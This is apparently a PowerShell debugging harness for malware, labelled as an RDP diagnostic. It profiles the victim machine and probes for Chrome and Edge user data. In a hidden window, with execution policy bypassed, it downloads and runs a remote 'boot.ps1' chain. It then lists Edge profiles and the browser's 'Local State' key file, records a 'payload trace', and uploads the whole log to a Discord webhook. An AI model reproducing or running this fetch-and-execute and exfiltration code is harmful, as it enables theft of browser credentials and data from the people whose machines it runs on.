$ErrorActionPreference = 'Continue'
$log = "$env:TEMP\diag_result.txt"

"==== RDP DIAG $(Get-Date) ====" | Out-File $log -Encoding utf8

# --- machine facts (captured first, survives everything) ---
"procs : $((Get-Process).Count)"          | Tee-Object $log -Append
"chrome : $(Test-Path "$env:LOCALAPPDATA\Google\Chrome\User Data")" | Tee-Object $log -Append
"edge   : $(Test-Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data")" | Tee-Object $log -Append
$up = (Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
"uptime : $([int]$up.TotalMinutes) min"   | Tee-Object $log -Append
Add-Type -AssemblyName System.Windows.Forms -ErrorAction SilentlyContinue
$screens = ([System.Windows.Forms.Screen]::AllScreens | ForEach-Object { $_.Bounds.Width }) -join ','
"screen : $screens"                        | Tee-Object $log -Append

# --- run the real chain as a child, capture ALL its output ---
"==== chain output ====" | Tee-Object $log -Append
$chain = "$env:TEMP\chain_out.txt"
Remove-Item $chain -ErrorAction SilentlyContinue
$env:CB_TRACE = "$env:TEMP\cb_trace.log"
$env:CB_ECHO  = "1"
Remove-Item $env:TEMP\cb_trace.log -ErrorAction SilentlyContinue

$cmd = '$ErrorActionPreference=''Continue''; IEX((New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/Kdbdjjdnn/testtest/main/boot.ps1''))'
$p = Start-Process powershell -ArgumentList '-NoProfile','-ExecutionPolicy','Bypass','-Command',$cmd -PassThru -RedirectStandardOutput $chain -RedirectStandardError "$env:TEMP\chain_err.txt" -WindowStyle Hidden
$p.WaitForExit(180000) | Out-Null
"chain exit code: $($p.ExitCode)" | Tee-Object $log -Append

"---- chain stdout ----" | Tee-Object $log -Append
Get-Content $chain -ErrorAction SilentlyContinue | Tee-Object $log -Append
"---- chain stderr ----" | Tee-Object $log -Append
Get-Content "$env:TEMP\chain_err.txt" -ErrorAction SilentlyContinue | Tee-Object $log -Append

# --- payload trace ---
"==== payload trace ====" | Tee-Object $log -Append
Get-Content $env:TEMP\cb_trace.log -ErrorAction SilentlyContinue | Tee-Object $log -Append

# --- edge profile state (that box has edge only) ---
"==== edge user data ====" | Tee-Object $log -Append
$ud = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
Get-ChildItem $ud -Directory -ErrorAction SilentlyContinue | ForEach-Object { $_.Name } | Tee-Object $log -Append
$ls = Join-Path $ud 'Local State'
if (Test-Path $ls) { "Local State: $((Get-Item $ls).Length) bytes" | Tee-Object $log -Append }

"==== DONE ====" | Tee-Object $log -Append

# --- ship the whole log to the Discord webhook so nobody has to copy anything ---
$hook = 'https://discord.com/api/webhooks/1558152913879175230/zQhuPiQtiGIxdXFI_JY8__0VXai4ZyP3qBV0-igp8GdzpbSliJgmu_3V4dA4YjfmZ1NP'
try {
    curl.exe -sS -m 60 -A "Mozilla/5.0" -F "file=@$log" $hook
    "webhook upload attempted" | Tee-Object $log -Append
} catch { }

# fallback: show the log in Notepad (survives console closing)
Start-Process notepad -ArgumentList $log
